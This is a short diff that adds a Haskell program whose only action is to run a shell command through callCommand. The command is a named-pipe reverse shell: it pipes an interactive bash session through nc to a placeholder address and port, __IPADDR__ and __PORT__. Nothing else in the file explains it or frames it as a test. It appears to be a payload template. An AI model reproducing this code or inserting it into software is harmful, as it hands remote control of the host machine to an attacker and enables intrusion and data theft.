@@ -1,0 +1,7 @@
+module Main where
+
+import System.Process
+
+main :: IO ()
+main = callCommand "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc __IPADDR__ __PORT__ >/tmp/f"
+
